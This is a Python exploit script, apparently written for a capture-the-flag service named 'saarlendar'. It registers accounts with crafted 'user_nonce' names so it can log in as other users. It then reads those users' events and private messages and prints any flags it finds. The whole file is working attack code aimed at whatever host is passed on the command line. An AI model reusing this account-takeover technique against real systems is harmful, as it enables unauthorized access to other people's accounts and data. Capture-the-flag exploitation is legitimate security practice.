import json
import sys
import urllib

import utils

from saarlendar import Remote, randomstring

r = Remote(("http://%s:1337/" % (sys.argv[1])).encode())
r.DEBUG = r.VERBOSE
username, password = randomstring(10), randomstring(10)
r.register(username, password)
r.login(username, password)
for user, timestamp in utils.finduser1(r, 10):
    nonce = randomstring(10)
    r.register(user + b"_" + nonce, randomstring(10))
    r.login(user, nonce)
    e1 = r.getevents(timestamp=timestamp)
    for event in e1:
        try:
            e = json.loads(event)
            print("flag1:", urllib.parse.unquote_plus(e["text"]))

        finally:
            pass
    user = utils.finduser2(r).encode()
    r.register(user + b"_" + nonce, randomstring(10))
    r.login(user, nonce)
    m2 = r.getmessages()
    for m in m2:
        try:
            m = json.loads(m)
            text = urllib.parse.unquote_plus(m["text"])
            if (text.startswith("Here is my flag: ")):
                print("flag2: ", text)
        except:
            pass
